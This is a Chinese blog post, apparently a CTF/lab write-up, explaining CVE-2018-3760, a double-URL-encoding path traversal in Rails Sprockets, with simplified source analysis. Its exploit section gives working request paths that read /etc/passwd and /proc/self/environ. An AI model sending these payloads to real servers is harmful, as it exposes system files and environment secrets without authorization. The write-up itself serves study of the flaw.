@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulfocusrails-cve_2018_3760漏洞详解+源码分析 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulfocus&#x2F;rails-cve_2018_3760漏洞详解+源码分析本文参考技术文章： https:&#x2F;&#x2F;qkl.seebug.org&#x2F;vuldb&#x2F;ssvid-97466 0x01 漏洞介绍：123456789 名称: vulfocus&#x2F;rails-cve_2018_3760:new 描述: Ruby On Rails 是著名的 Ruby Web 开发框架，它在开发环境中使用 Spr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulfocusrails-cve_2018_3760漏洞详解+源码分析">
+<meta property="og:url" content="https://24kmagic.site/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusrails-cve_2018_3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html">
+<meta property="og:site_name" content="24kmagic">
+<meta property="og:description" content="vulfocus&#x2F;rails-cve_2018_3760漏洞详解+源码分析本文参考技术文章： https:&#x2F;&#x2F;qkl.seebug.org&#x2F;vuldb&#x2F;ssvid-97466 0x01 漏洞介绍：123456789 名称: vulfocus&#x2F;rails-cve_2018_3760:new 描述: Ruby On Rails 是著名的 Ruby Web 开发框架，它在开发环境中使用 Spr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://24kmagic.site/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-05-14T14:24:22.000Z">
+<meta property="article:modified_time" content="2026-06-17T08:51:24.995Z">
+<meta property="article:author" content="qyt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://24kmagic.site/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "vulfocusrails-cve_2018_3760漏洞详解+源码分析",
+  "url": "https://24kmagic.site/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusrails-cve_2018_3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html",
+  "image": "https://24kmagic.site/img/butterfly-icon.png",
+  "datePublished": "2026-05-14T14:24:22.000Z",
+  "dateModified": "2026-06-17T08:51:24.995Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "qyt",
+      "url": "https://24kmagic.site"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://24kmagic.site/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusrails-cve_2018_3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulfocusrails-cve_2018_3760漏洞详解+源码分析',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background: [object Object];"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">112</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260308163912075.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">vulfocusrails-cve_2018_3760漏洞详解+源码分析</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulfocusrails-cve_2018_3760漏洞详解+源码分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-14T14:24:22.000Z" title="发表于 2026-05-14 22:24:22">2026-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-17T08:51:24.995Z" title="更新于 2026-06-17 16:51:24">2026-06-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf%E9%A2%98%E8%A7%A3-web/">ctf题解/web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="vulfocus-rails-cve-2018-3760漏洞详解-源码分析"><a href="#vulfocus-rails-cve-2018-3760漏洞详解-源码分析" class="headerlink" title="vulfocus&#x2F;rails-cve_2018_3760漏洞详解+源码分析"></a>vulfocus&#x2F;rails-cve_2018_3760漏洞详解+源码分析</h1><p>本文参考技术文章：</p>
+<p><a target="_blank" rel="noopener" href="https://qkl.seebug.org/vuldb/ssvid-97466">https://qkl.seebug.org/vuldb/ssvid-97466</a></p>
+<h2 id="0x01-漏洞介绍："><a href="#0x01-漏洞介绍：" class="headerlink" title="0x01 漏洞介绍："></a>0x01 漏洞介绍：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 名称: vulfocus/rails-cve_2018_3760:new</span><br><span class="line"></span><br><span class="line"> 描述: </span><br><span class="line"></span><br><span class="line">Ruby On Rails 是著名的 Ruby Web 开发框架，它在开发环境中使用 Sprockets 作为静态文件服务器。Sprockets 是一个编译和分发静态资源文件的 Ruby 库。</span><br><span class="line"></span><br><span class="line">Sprockets 3.7.1及更低版本存在二次解码导致的路径遍历漏洞。攻击者可以%252e%252e/用来访问根目录并读取或执行目标服务器上的任何文件。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="0x02-知识点："><a href="#0x02-知识点：" class="headerlink" title="0x02 知识点："></a>0x02 知识点：</h2><blockquote>
+<h3 id="1-二次编码绕过"><a href="#1-二次编码绕过" class="headerlink" title="1.二次编码绕过"></a>1.二次编码绕过</h3><p>已知：</p>
+<p><code>.</code>的url编码是：%2e</p>
+<p><code>%2e</code>的url编码是：%252e</p>
+<p>所以：</p>
+<p>上一级目录原本是：..&#x2F;</p>
+<p>为了绕过我们改成：<code>%252e%252e/</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415164146022.png" alt="image-20260415164145960"></p>
+</blockquote>
+<blockquote>
+<h3 id="2-简单了解RoR（ruby-on-rails）"><a href="#2-简单了解RoR（ruby-on-rails）" class="headerlink" title="2.简单了解RoR（ruby on rails）"></a>2.简单了解RoR（ruby on rails）</h3><p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415140906434.png" alt="image-20260415140906356"></p>
+<p>笔者十分认同这个理念，还看了篇文章<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/103633703">https://zhuanlan.zhihu.com/p/103633703</a></p>
+<p>评论也有大佬在讨论，顺便纠正了文章一些错误</p>
+</blockquote>
+<blockquote>
+<h3 id="3-顺便了解Sprockets"><a href="#3-顺便了解Sprockets" class="headerlink" title="3.顺便了解Sprockets"></a>3.顺便了解Sprockets</h3><p>如果网页里引用了 20 个 JS 文件和 10 个 CSS 文件，浏览器就得发起 30 次请求，这会让加载速度变慢。</p>
+<p>而且，如果你用了 Sass 写样式，或者用 CoffeeScript 写脚本，浏览器读不懂。</p>
+<p>Sprockets 的出现就是为了干这三件事：</p>
+<ul>
+<li><strong>合并（Concatenation）：</strong> 把几十个小 JS 文件揉成一个大的 <code>application.js</code>，减少 HTTP 请求次数。</li>
+<li><strong>预编译（Preprocessing）：</strong> 自动把 Sass 变成 CSS，把 CoffeeScript 变成 JavaScript。</li>
+<li><strong>依赖管理：</strong> 只需要在文件开头写一行注释（比如 <code>//= require jquery</code>），它就能自动帮你把需要的文件找出来并排好先后顺序。</li>
+</ul>
+<p>—————-&gt;</p>
+<p><strong>如何使用Sprockets？</strong></p>
+<p>查看源码(<a target="_blank" rel="noopener" href="https://github.com/rails/sprockets-rails/blob/49bf8022c8d3e1d7348b3fe2e0931b2e448f1f58/lib/sprockets/railtie.rb#L50">https://github.com/rails/sprockets-rails/blob/49bf8022c8d3e1d7348b3fe2e0931b2e448f1f58/lib/sprockets/railtie.rb#L50</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;def build_environment(app, initialized = nil)</span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">     env = Sprockets::Environment.new(app.root.to_s)	//env是sprockets引擎</span><br><span class="line">...</span><br><span class="line">  env	//返回env</span><br><span class="line">     end</span><br><span class="line">     </span><br><span class="line">&gt;.....</span><br><span class="line">     if config.assets.compile</span><br><span class="line">       app.assets = self.build_environment(app, true)	</span><br><span class="line">       //app.assets就是sprockets库里面的Environment类的实例</span><br><span class="line">       app.routes.prepend do</span><br><span class="line">         mount app.assets =&gt; config.assets.prefix</span><br><span class="line">       end</span><br><span class="line">     end</span><br><span class="line">&gt;.....       </span><br><span class="line">      </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">&gt;config.assets.prefix = &quot;/assets&quot;</span><br><span class="line">&gt;.......</span><br><span class="line">&gt;app.routes.prepend do</span><br><span class="line"> mount app.assets =&gt; config.assets.prefix	//mount为挂载：意味着所有的/assets后面的内容都让app.assets解析</span><br><span class="line">&gt;end</span><br></pre></td></tr></table></figure>
+
+<p><strong>凡是 <code>/assets/</code> 开头的请求，全部交给 Sprockets 解析</strong></p>
+</blockquote>
+<hr>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><p>目标是：assets&#x2F;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，访问得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assets/file:%2f%2f/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415153257769.png" alt="image-20260415153257703"></p>
+<p>发现可利用路径&#x2F;usr&#x2F;src&#x2F;blog&#x2F;app&#x2F;assets&#x2F;images&#x2F;</p>
+<p>进行二次绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415151631149.png" alt="image-20260415151631048"></p>
+<p>读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/proc/self/environ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260415160723768.png" alt="image-20260415160723692"></p>
+<h2 id="0x04-漏洞原理"><a href="#0x04-漏洞原理" class="headerlink" title="0x04 漏洞原理"></a>0x04 漏洞原理</h2><p>这么好用的Sprockets怎么就产生漏洞了呢？</p>
+<p>为了方便理解原理，一下代码进行了简化</p>
+<p>文件一：server.rb（对<code>..</code>的过滤）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># server.rb</span><br><span class="line">def call(env)</span><br><span class="line">    # 1. 第一次解码：将 %252e 解码为 %2e</span><br><span class="line">    path = Rack::Utils.unescape(env[&#x27;PATH_INFO&#x27;].to_s.sub(/^\//, &#x27;&#x27;))</span><br><span class="line">	# 2. path 值为 &quot;.../%2e%2e/%2e%2e/Windows/win.ini&quot;</span><br><span class="line">	</span><br><span class="line">    # forbidden_request过滤</span><br><span class="line">    if forbidden_request?(path)</span><br><span class="line">        return forbidden_response(env)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">private</span><br><span class="line">def forbidden_request?(path)</span><br><span class="line">    path.include?(&quot;..&quot;) || absolute_path?(path)</span><br><span class="line">    #因为我们被解码后值是%2e%2e，并不是”..“，所以没被发现</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>文件二：sprockets&#x2F;path_utils.rb</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># sprockets/path_utils.rb</span><br><span class="line">def split_file_uri(uri)</span><br><span class="line">    # ... 略 ...</span><br><span class="line">    </span><br><span class="line">    # 3. 第二次解码：</span><br><span class="line">    # 将上一步剩下的 &quot;%2e%2e&quot; 解码为 &quot;..&quot;</span><br><span class="line">    path = URI::Generic::DEFAULT_PARSER.unescape(path)</span><br><span class="line">    </span><br><span class="line">    # 4. path 变成：&quot;C:/.../assets/../../../../../../Windows/win.ini&quot;</span><br><span class="line">    path.force_encoding(Encoding::UTF_8)</span><br><span class="line">    [scheme, host, path, query]</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>文件一：sprockets&#x2F;loader.rb简化版</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># sprockets/loader.rb </span><br><span class="line">def load_from_unloaded(unloaded)</span><br><span class="line">    filename = unloaded.filename # 获取上面那个path</span><br><span class="line">    </span><br><span class="line">    # 5. 寻找处理器：处理对应后缀的文件</span><br><span class="line">    processor = find_processors_for_extension(&quot;.erb&quot;)</span><br><span class="line">    </span><br><span class="line">    if processor</span><br><span class="line">        # 6. 执行：如果找到了 ERB 处理器，会运行 erb 文件里 &lt;% %&gt; 之间的任何 Ruby 代码</span><br><span class="line">        render_asset(filename) </span><br><span class="line">    else</span><br><span class="line">        # 如果是 .ini，没找到处理器，就直接当成文本读取返回</span><br><span class="line">        read_file_directly(filename)</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p><code>app.assets</code> 就是 <code>Sprockets::Environment</code>。</p>
+<p>那么访问 <code>/assets/file://...</code> 时，由于是由Sprockets解析，请求实际上是给了app.assets，也就是Sprockets库里的Environment类所创建的实例。</p>
+<p>这个实例在寻找资源时，会调用它内部的 <code>find_asset</code> 函数。</p>
+<p><strong>而 CVE-2018-3760 这个漏洞本质上就是： <code>Sprockets::Environment</code> 这个引擎在 <code>find_asset</code> 过程中，没能识别出经过双重编码处理后的穿越路径。</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://24kmagic.site">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://24kmagic.site/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusrails-cve_2018_3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html">https://24kmagic.site/posts/ctf%E9%A2%98%E8%A7%A3/web/vulfocusrails-cve_2018_3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3+%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://24kmagic.site" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/ctf%E9%A2%98%E8%A7%A3/misc/BUUCTF%20MISC%20%E4%B9%9D%E8%BF%9E%E7%8E%AF.html" title="BUUCTF MISC 九连环"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">BUUCTF MISC 九连环</div></div><div class="info-2"><div class="info-item-1">BUUCTF MISC 九连环1.binwalk和foremost之后拿到zip，发现要密码，我就试试了123456cry发现不行  2.打开010发现50 4B 01 02，原来是伪加密，全局方式位标记改成00 00  保存重新打开发现  你说给我们一个压缩包，再给我们张图片是什么意思呢？ 拿着图片里面的信息解压zip啊 3.图片存在隐写，下载steghide提取图片信息，然后打开复制文本信息，作为密码解压zip压缩包 这里steghide的密码直接回车就好了  为什么？ 如果设置了密码，它会用密码对数据进行加密后再嵌入。 如果没有设置密码（即空密码），它就直接将数据按照算法逻辑塞进图片。  4.解压拿到flag  </div></div></div></a><a class="pagination-related" href="/posts/ctf%E9%A2%98%E8%A7%A3/web/%E4%B8%80%E5%88%86%E9%92%9F%E9%80%9F%E9%80%9ACVE-2019-13956%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0Discuz!ML%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html" title="一分钟速通CVE-2019-13956漏洞复现Discuz!ML远程代码执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">一分钟速通CVE-2019-13956漏洞复现Discuz!ML远程代码执行</div></div><div class="info-2"><div class="info-item-1">一分钟速通CVE-2019-13956漏洞复现Discuz!ML远程代码执行0x01 漏洞介绍123描述:Crossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。Discuz!ML 3.2 到 3.4 允许远程攻击者通过修改过的语言 cookie 执行任意 PHP 代码，如将 4gH4_0df5_language=en 更改为 4gH4_0df5_language=en&#x27;.phpinfo().&#x27; 所示；（如果使用了随机前缀 4gH4_0df5_）。  漏洞出现在传入cookie的language值时，逻辑是直接将传入的语言拼接成一个缓存文件，然后利用文件包含解析 由于并没有做过滤，我们拥有可控的文件名 0x02 poc抓包，在cookie中原有语言后，加入 1&#x27;.phpinfo().&#x27;   查看flag即可  0x03 漏洞溯源:下载源码 1https://bitbucket.org/vot/discuz.ml/downloads/  1.upload\source...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">112</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="知乎"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="小红书"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="网易云音乐"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">很高兴能向你展示我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulfocus-rails-cve-2018-3760%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span 